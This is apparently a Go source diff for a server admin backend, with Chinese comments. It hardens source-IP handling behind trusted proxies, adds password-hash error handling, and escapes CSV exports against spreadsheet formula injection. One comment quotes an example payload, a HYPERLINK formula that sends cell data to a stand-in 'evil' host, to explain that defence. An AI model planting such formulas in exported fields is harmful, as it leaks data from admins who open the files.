@@ -131,8 +131,11 @@ func auditAs(c *gin.Context, username, action, target, detail string, ok bool) {
 		if username == "" {
 			username = currentUser(c)
 		}
-		// 用 RemoteIP 而不是 ClientIP：审计里的来源地址不该被请求头改写
-		entry.IP = cleanField(c.RemoteIP(), 64)
+		// 来源地址走 clientIP：对端不可信时一律忽略转发头（防伪造），
+		// 对端在 TRUSTED_PROXIES 内时才从右往左解析出真实客户端。
+		// 直接写 RemoteIP 会让反代部署下所有日志都变成 127.0.0.1，
+		// 出事时完全无法回溯是谁操作的。
+		entry.IP = cleanField(clientIP(c), 64)
 	}
 	entry.Username = cleanField(username, 64)
 
@@ -156,11 +159,13 @@ func audit(c *gin.Context, action, target, detail string, ok bool) {
 // 攻击者只要拿错误密码狂刷 admin，真正的管理员就被挡在门外。
 // 按 IP 锁定则相反 —— 被挡住的正是发起攻击的那台机器。
 //
-// 另外两个容易写错、写错就形同虚设的点：
-//   - 来源地址必须取 RemoteIP（真实 TCP 对端）。ClientIP 会采信
-//     X-Forwarded-For，而那是请求方随手就能编的，等于没有限流。
+// 另外三个容易写错、写错就形同虚设的点：
+//   - 来源地址必须走 clientIP：对端不可信时忽略转发头（否则换个
+//     X-Forwarded-For 就换了个身份，限流形同虚设）；对端可信时才
+//     解析转发头（否则反代下全体访客共用一个桶，一个人就能锁死所有人）。
 //   - 已经处于锁定中的请求【不再累加计数】。否则攻击者持续请求
 //     就能无限延长锁定窗口，被锁的账号永远解不开。
+//   - 桶数有上限（loginGuardCap）。否则伪造大量来源就能把内存撑爆。
 
 const (
 	loginMaxFails  = 5                // 连续失败次数上限
@@ -181,7 +186,7 @@ var loginGuard = struct {
 }{m: make(map[string]*loginAttempt)}
 
 func loginKey(c *gin.Context) string {
-	return cleanField(c.RemoteIP(), 64)
+	return cleanField(clientIP(c), 64)
 }
 
 func loginGuardSize() int {
@@ -572,8 +577,13 @@ func registerAdminRoutes(auth *gin.RouterGroup) {
 			c.String(400, msg)
 			return
 		}
+		hashed, err := hashPwd(newPwd)
+		if err != nil {
+			c.String(500, "保存失败，请重试")
+			return
+		}
 		if err := db.Model(&User{}).Where("id = ?", u.ID).
-			Update("password", hashPwd(newPwd)).Error; err != nil {
+			Update("password", hashed).Error; err != nil {
 			c.String(500, "保存失败，请重试")
 			return
 		}
@@ -657,12 +667,13 @@ func registerAdminRoutes(auth *gin.RouterGroup) {
 		globalConfig.RUnlock()
 
 		c.JSON(200, gin.H{
-			"max_fails":      loginMaxFails,
-			"lock_minutes":   int(loginLockFor.Minutes()),
-			"window_minutes": int(loginFailSlack.Minutes()),
-			"entries":        items,
-			"session_epoch":  epoch,
-			"bcrypt_cost":    bcryptCost,
+			"max_fails":       loginMaxFails,
+			"lock_minutes":    int(loginLockFor.Minutes()),
+			"window_minutes":  int(loginFailSlack.Minutes()),
+			"entries":         items,
+			"session_epoch":   epoch,
+			"bcrypt_cost":     bcryptCost,
+			"trusted_proxies": trustedProxiesSpec(),
 		})
 	})
 
@@ -921,7 +932,8 @@ func registerAdminRoutes(auth *gin.RouterGroup) {
 			w := csv.NewWriter(c.Writer)
 			_ = w.Write(header)
 			for _, r := range records {
-				_ = w.Write(r)
+				// 每个字段都过一遍公式注入转义（表头是常量，无需处理）
+				_ = w.Write(csvSafeRow(r))
 			}
 			w.Flush()
 			audit(c, "data_export", name, fmt.Sprintf("导出 %s（CSV，%d 条）", name, len(records)), true)
@@ -1168,6 +1180,48 @@ func inspectBackup(path string) (string, error) {
 
 	return fmt.Sprintf("备份完成：%s，完整性 ok，账号 %d、节点 %d、监控历史 %d 条",
 		humanSize(st.Size()), users, nodes, hist), nil
+}
+
+// ================= CSV 导出安全 =================
+
+// csvSafe 中和 Excel / WPS / Numbers 的公式注入。
+//
+// 这些表格软件会把以 = + - @ 以及 TAB / CR 开头的单元格当成公式求值。
+// 而导出内容里的操作者、节点别名、告警文案、监控目标全是用户可控的自由
+// 输入：攻击者只要把节点别名改成
+//
+//	=HYPERLINK("http://evil/?"&A1,"点我")
+//
+// 管理员导出操作日志、用 Excel 打开的那一刻就会触发外带请求（公式在
+// 打开时求值）。这是「导出」类功能的通用坑，与具体业务无关。
+//
+// '-' 必须单独处理：它既是公式前缀也是负号。一刀切转义会让 -5 变成文本，
+// 数值列的排序与求和全部失效。判据用「能否解析成数字」。
+func csvSafe(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '@', '\t', '\r':
+		return "'" + s
+	case '-':
+		if _, err := strconv.ParseFloat(strings.TrimSpace(s), 64); err == nil {
+			return s // 是负数，放行
+		}
+		return "'" + s
+	}
+	return s
+}
+
+// csvSafeRow 逐字段转义并返回新切片。
+// 刻意不就地修改入参：表头这类切片常常是包级共享的，
+// 就地改会让它永久带上单引号，之后每次导出都多一个 '。
+func csvSafeRow(in []string) []string {
+	out := make([]string, len(in))
+	for i, v := range in {
+		out[i] = csvSafe(v)
+	}
+	return out
 }
 
 // ================= 后台维护任务 =================
